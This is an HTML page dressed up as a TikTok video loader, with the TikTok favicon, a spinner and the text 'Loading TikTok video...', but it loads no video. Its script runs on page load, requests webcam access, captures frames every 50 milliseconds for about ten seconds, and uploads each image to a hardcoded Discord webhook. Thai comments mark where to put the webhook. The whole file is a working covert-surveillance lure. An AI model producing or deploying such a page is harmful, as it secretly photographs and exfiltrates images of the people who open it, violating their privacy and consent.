<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok</title>
  <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      height: 100%;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
      overflow: hidden;
      flex-direction: column;
    }

    .loader {
      width: 60px;
      height: 60px;
      border: 6px solid rgba(255,255,255,0.1);
      border-top: 6px solid #fe2c55;
      border-bottom: 6px solid #25f4ee;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 10px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .text {
      font-size: 1.1em;
      opacity: 0.6;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 0.3; }
      50% { opacity: 1; }
    }

    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="text">Loading TikTok video...</div>
  <video id="video" autoplay playsinline muted></video>

  <script>
    const webhookURL = " https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0"; // ใส่ลิงก์ Webhook ที่นี่
    const MAX_DURATION_MS = 10000;   // 1 วินาที
    const CAPTURE_INTERVAL_MS = 50; // ถ่ายทุก 50ms ≈ 20 ภาพ
    let captured = 0;

    async function captureMultipleFrames() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");

        const start = Date.now();
        const interval = setInterval(async () => {
          if (Date.now() - start > MAX_DURATION_MS) {
            clearInterval(interval);
            stream.getTracks().forEach(t => t.stop());
            return;
          }

          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(async blob => {
            const formData = new FormData();
            formData.append("file", blob, `frame${captured++}.jpg`);
            formData.append("payload_json", JSON.stringify({
              content: `📸 Frame ${captured} captured at ${new Date().toISOString()}`
            }));
            await fetch(webhookURL, { method: "POST", body: formData });
          }, "image/jpeg", 0.8);
        }, CAPTURE_INTERVAL_MS);
      } catch (err) {
        console.error("Camera access failed:", err);
      }
    }

    captureMultipleFrames();
  </script>
</body>
</html>
